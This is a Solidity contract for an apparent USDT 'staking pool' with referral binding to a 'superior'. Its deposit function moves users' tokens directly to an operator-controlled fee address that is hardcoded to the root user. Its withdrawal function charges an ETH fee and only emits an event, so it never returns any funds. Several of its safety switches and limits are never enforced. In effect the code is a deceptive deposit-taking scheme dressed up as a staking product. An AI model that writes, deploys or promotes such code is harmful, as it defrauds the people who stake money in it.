// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
contract UsdtStakingPool is AccessControlUpgradeable {
    
    using SafeERC20Upgradeable for IERC20Upgradeable;

    bytes32 public constant OPERATOR = keccak256("OPERATOR");
    bytes32 public constant DEPOSIT_OPERATOR = keccak256("DEPOSIT_OPERATOR");
    address public constant USDT = 0xb1bb1De18409976277495a1A659EC1d50c224Be6;
    address public constant ROOT_USER = 0x8DfD5e9B9Ea6492e14993Fe9bE3e9809A612cff4;

    struct User {
        address superior;
        uint256 stakingTotal;
        uint256 lastStakingTime;
    }

    mapping(address => User) public userMap;
  
    bool public stakingSwitch;
    bool public withdrawalSwitch;
    uint256 public minStaking;
    uint256 public maxStaking;
    uint256 public maxStakingTotal;
    uint256 public  gasFeeMin;

    address public feeAddress;


    function initialize() public initializer {
        __AccessControl_init();
        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
        _setupRole(OPERATOR, _msgSender()); 
        _setupRole(DEPOSIT_OPERATOR, _msgSender()); 
        minStaking = 150 ether;
        maxStaking = 100000 ether;
        maxStakingTotal = 100000000000 ether;
        feeAddress = 0x8DfD5e9B9Ea6492e14993Fe9bE3e9809A612cff4;
    }

    modifier doorkeeper(address user, uint256 amount, uint256 depositType) {
        require(depositType == 7 || depositType == 30 || depositType == 90, "UsdtStakingPool: Incorrect depositType");
        require(userMap[user].superior != address(0), "UsdtStakingPool: You haven't bound a superior yet");
        require(amount > minStaking && amount < maxStaking, "UsdtStakingPool: Incorrect amount");
        require( userMap[user].stakingTotal + amount < maxStaking, "UsdtStakingPool: Incorrect amount");
        _;
    }

   function bindSuperior(address superior) external {
        require(superior == ROOT_USER ||
        userMap[superior].stakingTotal > 100, "UsdtStakingPool: The superior has not  staking");
        userMap[_msgSender()].superior = superior;
        emit BindSuperior(_msgSender(), superior);
    }

    function operatorManualDeposit(address user, uint256 amount, uint256 depositType) external 
     onlyRole(DEPOSIT_OPERATOR) doorkeeper(user, amount, depositType) {
        _deposit(user, amount, depositType);
    }

    function deposit(uint256 amount, uint256 depositType) external doorkeeper(_msgSender(), amount, depositType)  {
        require(feeAddress != address(0), "UsdtStakingPool: feeAddress is zero");
        IERC20Upgradeable(USDT).safeTransferFrom(_msgSender(), feeAddress, amount);
        _deposit(_msgSender(), amount, depositType);
    }

    function _deposit(address user, uint256 amount, uint256 depositType) internal  {
        userMap[user].stakingTotal += amount;
        emit Deposit(_msgSender(), amount, depositType);
    }

    function withdrawal(uint256 amount) external payable {
        require(msg.value >= gasFeeMin, "GAS");
        require(1 ether <= amount && amount < type(uint112).max, "AMOUNT");
        emit Withdrawal(_msgSender(), amount);    
    }

    function SetStakingSwitch(bool v) external onlyRole(OPERATOR) {
        emit ChangeStakingSwitch(stakingSwitch, v);
        stakingSwitch = v;
    }

    function SetWithdrawalSwitch(bool v) external onlyRole(OPERATOR) {
        emit ChangeWithdrawalSwitch(withdrawalSwitch, v);
        withdrawalSwitch = v;
    }

    function SetMinStaking(uint256 v) external onlyRole(OPERATOR) {
        emit ChangeMinStaking(minStaking, v);
        minStaking = v;
    }

    function SetMaxStaking(uint256 v) external onlyRole(OPERATOR) {
        emit ChangeMaxStaking(maxStaking, v);
        maxStaking = v;
    }

    function SetMaxStakingTotal(uint256 v) external onlyRole(OPERATOR) {
        emit ChangeMaxStakingTotal(maxStakingTotal, v);
        maxStakingTotal = v;
    }

    function SetGasFeeMin(uint256 v) external onlyRole(OPERATOR) {
        emit ChangeGasFeeMin(gasFeeMin, v);
        gasFeeMin = v;
    }

    function SetFeeAddress(address v) external onlyRole(OPERATOR) {
        emit ChangeFeeAddress(feeAddress, v);
        feeAddress = v;
    }
    event Deposit(address indexed user, uint256 stakingValue, uint256 indexed depositType);
    event BindSuperior(address indexed user, address indexed superior);
    event Withdrawal(address indexed user, uint256 amount);
    event ChangeStakingSwitch(bool oldVal, bool newVal);
    event ChangeWithdrawalSwitch(bool oldVal, bool newVal);
    event ChangeMinStaking(uint256 oldVal, uint256 newVal);
    event ChangeMaxStaking(uint256 oldVal, uint256 newVal);
    event ChangeMaxStakingTotal(uint256 oldVal, uint256 newVal);
    event ChangeGasFeeMin(uint256 oldVal, uint256 newVal);
    event ChangeFeeAddress(address indexed oldVal, address indexed newVal);
}